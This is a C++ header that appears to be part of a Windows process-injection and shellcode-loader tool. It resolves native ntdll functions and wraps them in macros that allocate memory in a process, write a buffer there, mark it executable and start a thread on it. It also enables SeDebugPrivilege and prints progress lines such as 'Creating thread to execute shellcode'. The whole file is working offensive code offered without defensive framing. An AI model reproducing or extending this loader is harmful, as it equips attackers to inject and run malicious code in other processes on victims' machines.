#pragma once
#include <windows.h>
#include <stdio.h>
#include <string>
#include <iostream> 

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

typedef NTSTATUS(NTAPI* PFN_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* PFN_NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

typedef NTSTATUS(NTAPI* PFN_NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* PFN_NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

typedef NTSTATUS(NTAPI* PFN_NtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
    );

typedef NTSTATUS(NTAPI* PFN_NtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

typedef NTSTATUS(NTAPI* PFN_NtClose)(
    HANDLE Handle
    );

PFN_NtAllocateVirtualMemory NtAllocateVirtualMemory;
PFN_NtProtectVirtualMemory NtProtectVirtualMemory;
PFN_NtWriteVirtualMemory NtWriteVirtualMemory;
PFN_NtCreateThreadEx NtCreateThreadEx;
PFN_NtWaitForSingleObject NtWaitForSingleObject;
PFN_NtFreeVirtualMemory NtFreeVirtualMemory;
PFN_NtClose NtClose;

HANDLE processHandle;
PVOID baseAddress;
SIZE_T regionSize;
ULONG allocationType;
ULONG protect;
ULONG oldProtect;
NTSTATUS status;
HANDLE threadHandle;
SIZE_T bytesWritten;

#define Sq_AllocateMemory(processHandle, baseAddress, regionSize, allocationType, protect) \
    do { \
        status = NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &regionSize, allocationType, protect); \
        if (status != STATUS_SUCCESS) { \
            printf("NtAllocateVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_WriteVirtualMemory(processHandle, baseAddress, buffer, bufferSize) \
    do { \
        status = NtWriteVirtualMemory(processHandle, baseAddress, buffer, bufferSize, &bytesWritten); \
        if (status != STATUS_SUCCESS || bytesWritten != bufferSize) { \
            printf("NtWriteVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_ProtectVirtualMemory(processHandle, baseAddress, regionSize, protect) \
    do { \
        status = NtProtectVirtualMemory(processHandle, &baseAddress, &regionSize, protect, &oldProtect); \
        if (status != STATUS_SUCCESS) { \
            printf("NtProtectVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_CreateThreadEx(threadHandle, processHandle, baseAddress) \
    do { \
        status = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, processHandle, baseAddress, NULL, FALSE, 0, 0, 0, NULL); \
        if (status != STATUS_SUCCESS) { \
            printf("NtCreateThreadEx failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_WaitForSingleObject(threadHandle) \
    do { \
        status = NtWaitForSingleObject(threadHandle, FALSE, NULL); \
        if (status != STATUS_SUCCESS) { \
            printf("NtWaitForSingleObject failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_Close(handle) \
    do { \
        status = NtClose(handle); \
        if (status != STATUS_SUCCESS) { \
            printf("NtClose failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_FreeVirtualMemory(processHandle, baseAddress, regionSize) \
    do { \
        status = NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, MEM_RELEASE); \
        if (status != STATUS_SUCCESS) { \
            printf("NtFreeVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
        baseAddress = NULL; \
    } while(0)

BOOL InitNtFunctions() {
    HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
    if (!hNtDll) {
        printf("Failed to get handle to ntdll.dll\n");
        return FALSE;
    }

    NtAllocateVirtualMemory = (PFN_NtAllocateVirtualMemory)GetProcAddress(hNtDll, "NtAllocateVirtualMemory");
    NtProtectVirtualMemory = (PFN_NtProtectVirtualMemory)GetProcAddress(hNtDll, "NtProtectVirtualMemory");
    NtWriteVirtualMemory = (PFN_NtWriteVirtualMemory)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
    NtCreateThreadEx = (PFN_NtCreateThreadEx)GetProcAddress(hNtDll, "NtCreateThreadEx");
    NtWaitForSingleObject = (PFN_NtWaitForSingleObject)GetProcAddress(hNtDll, "NtWaitForSingleObject");
    NtFreeVirtualMemory = (PFN_NtFreeVirtualMemory)GetProcAddress(hNtDll, "NtFreeVirtualMemory");
    NtClose = (PFN_NtClose)GetProcAddress(hNtDll, "NtClose");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtWriteVirtualMemory ||
        !NtCreateThreadEx || !NtWaitForSingleObject || !NtFreeVirtualMemory || !NtClose) {
        printf("Failed to get address of NT functions\n");
        return FALSE;
    }

    return TRUE;
}
bool EnableDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tokenPrivileges;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luid;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL)) {
        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

void PrintSlashAnimation() {
    const int animationDelay = 200;
    const int animationDuration = 2000; 
    const char slash = '/';

    int startTime = GetTickCount64();
    while (GetTickCount64() - startTime < animationDuration) {
        putchar(slash);
        fflush(stdout);
        Sleep(animationDelay);
        putchar('\b'); 
        fflush(stdout);
        Sleep(animationDelay);
    }
}
void effect() {
    for (int i = 0; i < 10; ++i) {
        printf("\r  [");
        if (i % 2 == 0) {
            printf("\\");
        }
        else {
            printf("/");
        }
        printf("]");
        Sleep(100);
    }
}
void Debug() {
    printf("      Enableaing Debug privilege");
    effect();
    printf("[*] Debug privilege enabled \n");
}
void Ntdl() {
    printf("      Loading ntdll.dll");
    effect();
    printf("[*] Loaded ntdll.dll functions \n");
}
void NtVirt() {
    printf("      Loading function: NtAllocateVirtualMemory");
    effect();

    HMODULE hModule = LoadLibrary(L"ntdll.dll");
    if (hModule == NULL) {
        printf("[!] Failed to load ntdll.dll\n");
        return;
    }

    FARPROC procNtAllocateVirtualMemory = GetProcAddress(hModule, "NtAllocateVirtualMemory");
    if (!procNtAllocateVirtualMemory) {
        printf("[!] Failed to get function address: NtAllocateVirtualMemory\n");
        FreeLibrary(hModule);
        return;
    }

    printf("[*] Loaded function: NtAllocateVirtualMemory\n");
    printf("     [+] Address of function NtAllocateVirtualMemory: 0x%p\n", procNtAllocateVirtualMemory);

    FreeLibrary(hModule);
}

void NtWrite() {
    printf("      Loading function: NtWriteVirtualMemory");
    effect();

    HMODULE hModule = LoadLibrary(L"ntdll.dll");
    if (hModule == NULL) {
        printf("[!] Failed to load ntdll.dll\n");
        return;
    }

    FARPROC procNtWriteVirtualMemory = GetProcAddress(hModule, "NtWriteVirtualMemory");
    if (!procNtWriteVirtualMemory) {
        printf("[!] Failed to get function address: NtWriteVirtualMemory\n");
        FreeLibrary(hModule);
        return;
    }

    printf("[*] Loaded function: NtWriteVirtualMemory\n");
    printf("    [+] Address of function NtWriteVirtualMemory: 0x%p\n", procNtWriteVirtualMemory);

    FreeLibrary(hModule);
}

void NtProtect() {
    printf("      Loading function: NtProtectVirtualMemory");
    effect();

    HMODULE hModule = LoadLibrary(L"ntdll.dll");
    if (hModule == NULL) {
        printf("[!] Failed to load ntdll.dll\n");
        return;
    }

    FARPROC procNtProtectVirtualMemory = GetProcAddress(hModule, "NtProtectVirtualMemory");
    if (!procNtProtectVirtualMemory) {
        printf("[!] Failed to get function address: NtProtectVirtualMemory\n");
        FreeLibrary(hModule);
        return;
    }

    printf("[*] Loaded function: NtProtectVirtualMemory\n");
    printf("    [+] Address of function NtProtectVirtualMemory: 0x%p\n", procNtProtectVirtualMemory);

    FreeLibrary(hModule);
}

void PageMemR() {
    printf("      Setting memory protection to PAGE_EXECUTE_READWRITE ");
    effect();
    printf("[*] Memory protection set to PAGE_EXECUTE_READWRITE\n");
}

void NtThread() {
    printf("      Loading function: NtCreateThreadEx");
    effect();

    HMODULE hModule = LoadLibrary(L"ntdll.dll");
    if (hModule == NULL) {
        printf("[!] Failed to load ntdll.dll\n");
        return;
    }

    FARPROC procNtCreateThreadEx = GetProcAddress(hModule, "NtCreateThreadEx");
    if (!procNtCreateThreadEx) {
        printf("[!] Failed to get function address: NtCreateThreadEx\n");
        FreeLibrary(hModule);
        return;
    }

    printf("[*] Loaded function: NtCreateThreadEx\n");
    printf("    [+] Address of function NtCreateThreadEx: 0x%p\n", procNtCreateThreadEx);

    FreeLibrary(hModule);
}

void ThdxSc() {
    printf("      Creating thread to execute shellcode");
    effect();
    printf("[+] Thread created to execute shellcode\n");
}

void NtObjcect() {
    printf("      Loading function: NtWaitForSingleObject");
    effect();

    HMODULE hModule = LoadLibrary(L"ntdll.dll");
    if (hModule == NULL) {
        printf("[!] Failed to load ntdll.dll\n");
        return;
    }

    FARPROC procNtWaitForSingleObject = GetProcAddress(hModule, "NtWaitForSingleObject");
    if (!procNtWaitForSingleObject) {
        printf("[!] Failed to get function address: NtWaitForSingleObject\n");
        FreeLibrary(hModule);
        return;
    }

    printf("[*] Loaded function: NtWaitForSingleObject\n");
    printf("    [+] Address of function NtWaitForSingleObject: 0x%p\n", procNtWaitForSingleObject);

    FreeLibrary(hModule);
}

void NtFreeMemory() {
    printf("      Loading function: NtFreeVirtualMemory");
    effect();

    HMODULE hModule = LoadLibrary(L"ntdll.dll");
    if (hModule == NULL) {
        printf("[!] Failed to load ntdll.dll\n");
        return;
    }

    FARPROC procNtFreeVirtualMemory = GetProcAddress(hModule, "NtFreeVirtualMemory");
    if (!procNtFreeVirtualMemory) {
        printf("[!] Failed to get function address: NtFreeVirtualMemory\n");
        FreeLibrary(hModule);
        return;
    }

    printf("[*] Loaded function: NtFreeVirtualMemory\n");
    printf("    [+] Address of function NtFreeVirtualMemory: 0x%p\n", procNtFreeVirtualMemory);

    FreeLibrary(hModule);
}

void FredMem() {
    printf("      Freeing your memory");
    effect();
    printf("[+] Memory freed\n");
}

void Ntcose() {
    printf("      Loading function: NtClose");
    effect();

    HMODULE hModule = LoadLibrary(L"ntdll.dll");
    if (hModule == NULL) {
        printf("[!] Failed to load ntdll.dll\n");
        return;
    }

    FARPROC procNtClose = GetProcAddress(hModule, "NtClose");
    if (!procNtClose) {
        printf("[!] Failed to get function address: NtClose\n");
        FreeLibrary(hModule);
        return;
    }

    printf("[*] Loaded function: NtClose\n");
    printf("    [+] Address of function NtClose: 0x%p\n", procNtClose);

    FreeLibrary(hModule);
}

void PrintSectionProtection(DWORD characteristics) {
    if (characteristics & IMAGE_SCN_MEM_EXECUTE) {
        std::cout << "Executable ";
    }
    if (characteristics & IMAGE_SCN_MEM_READ) {
        std::cout << "Readable ";
    }
    if (characteristics & IMAGE_SCN_MEM_WRITE) {
        std::cout << "Writable ";
    }
    if (characteristics & IMAGE_SCN_MEM_DISCARDABLE) {
        std::cout << "Discardable ";
    }
    std::cout << std::endl;
}

void PrintDllInfo(HMODULE hModule) {
    if (!hModule) {
        std::cerr << "Invalid module handle." << std::endl;
        return;
    }
    BYTE* baseAddress = reinterpret_cast<BYTE*>(hModule);
    std::cout << "          [-] Base Address: 0x" << static_cast<void*>(baseAddress) << std::endl;

    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(baseAddress);
    IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(baseAddress + dosHeader->e_lfanew);

    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
        std::string sectionName(reinterpret_cast<char*>(section->Name), 8);
        if (sectionName.find(".text") != std::string::npos || sectionName.find("PAGE") != std::string::npos) {
            std::cout << "          [-] Section Name: " << sectionName << std::endl;
            std::cout << "          [-] Virtual Address: 0x" << static_cast<void*>(baseAddress + section->VirtualAddress) << std::endl;
            std::cout << "          [-] Size: " << section->Misc.VirtualSize << std::endl;
            std::cout << "          [-] Protection: ";
            PrintSectionProtection(section->Characteristics);
        }
    }
}
